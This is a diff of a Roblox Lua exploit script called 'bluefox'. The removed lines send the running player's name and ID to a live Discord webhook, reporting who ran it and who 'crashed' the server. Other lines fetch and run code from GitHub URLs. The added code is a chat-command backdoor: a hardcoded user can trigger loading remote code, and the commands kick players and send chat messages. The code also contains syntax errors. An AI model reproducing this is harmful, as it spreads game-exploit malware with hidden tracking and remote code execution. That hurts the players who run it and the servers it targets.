@@ -1185,37 +1185,73 @@ while true do
 		task.wait(1)
 end
 	end
-			local HTTP_ = game:GetService('HttpService')
-	local LPR = game:GetService('Players').LocalPlayer
-	local url =
-	"https://discord.com/api/webhooks/1147636061489610854/_kKGMNhlL96ECorx5Cdn0gNHzbStfdFD0BbHyFJJht-_tsUI9BR8xfuxAx-RRZHAHOk9"
-	local data = { ["username"] = "bluefox script",
-	["embeds"] = { { ["description"] = "Server crashed by", 
-	["fields"] = { { name = "Username", value = LPR.Name, inline = true }, { name = "Username", value = LPR.UserId,
-	inline = true }, }, ["color"] = tonumber(0x7269da), } } } 
-	local newdata = HTTP_:JSONEncode(data)
-	local headers = { ["content-type"] = "application/json" }
-	local request = http_request or request or HttpPost or syn.request
-	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-		else
+			-- Reload, Kick, and Message script
+
+local chatBotPrefix = "!"
+local allowedUserID = 202792190 -- Replace with the desired User ID
+
+local function sendReloadMessageToChatBot(player)
+    local reloadMessage = "Reloaded script 1.12.1"
+   
 end
-end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/tag"))()
-game.Players.PlayerAdded:Connect(function(player)
-    wait(1) -- Wait for a moment after the player joins
-    game:GetService("Chat"):Chat(player, "!!fmlk")
-		local HTTP_ = game:GetService('HttpService')
-	local LPR = game:GetService('Players').LocalPlayer
-	local url =
-	"https://discord.com/api/webhooks/1147636061489610854/_kKGMNhlL96ECorx5Cdn0gNHzbStfdFD0BbHyFJJht-_tsUI9BR8xfuxAx-RRZHAHOk9"
-	local data = { ["username"] = "bluefox script",
-	["embeds"] = { { ["description"] = "script active by", 
-	["fields"] = { { name = "Username", value = LPR.Name, inline = true }, { name = "Username", value = LPR.UserId,
-	inline = true }, }, ["color"] = tonumber(0x7269da), } } } 
-	local newdata = HTTP_:JSONEncode(data)
-	local headers = { ["content-type"] = "application/json" }
-	local request = http_request or request or HttpPost or syn.request
-	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-end)
+
+local function kickPlayerByUsername(player, username)
+    local targetPlayer = game.Players:FindFirstChild(username)
+
+    if targetPlayer then
+        targetPlayer:Kick("You have been kicked by " .. player.Name)
+    else
+        print("Player not found!")
+    end
+end
+
+local function sendMessageToPlayer(player, targetUsername, message)
+    local targetPlayer = game.Players:FindFirstChild(targetUsername)
+
+    if targetPlayer then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, targetPlayer.Name)
+    else
+        print("Player not found!")
+    end
+end
+
+local function onChatted(player, message)
+    local lowercaseMessage = string.lower(message)
+    if lowercaseMessage:sub(1, 1) == chatBotPrefix then
+        local command, argument = lowercaseMessage:match("(%w+)%s*(.*)")
+
+        if command == "reload" then
+            if player.UserId == allowedUserID then
+                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(R"eloaded script 1.12.1", "All")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/OhDaddyUwu/The-Bleufox-Script/main/Script"))()
+            else
+                print("no")
+            end
+        elseif command == "kick" then
+            if argument ~= "" then
+                if player.Name == argument then
+                    player:Kick("You have been kicked by yourself.")
+                else
+                    kickPlayerByUsername(player, argument)
+                end
+            else
+                print("Usage: !kick <playerUsername>")
+            end
+        elseif command == "msg" then
+            local targetUser, userMessage = argument:match("(%w+)%s*(.*)")
+            if targetUser ~= "" and userMessage ~= "" then
+                sendMessageToPlayer(player, targetUser, userMessage)
+            else
+                print("Usage: !msg <targetUsername> <message>")
+            end
+        end
+    end
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onChatted(player, msg)
+    end)
+end
 
 print "Oh Daddy UwU | no i dont care about it just what i did to it | i ait answering questions :> | UWU yddaD hO"
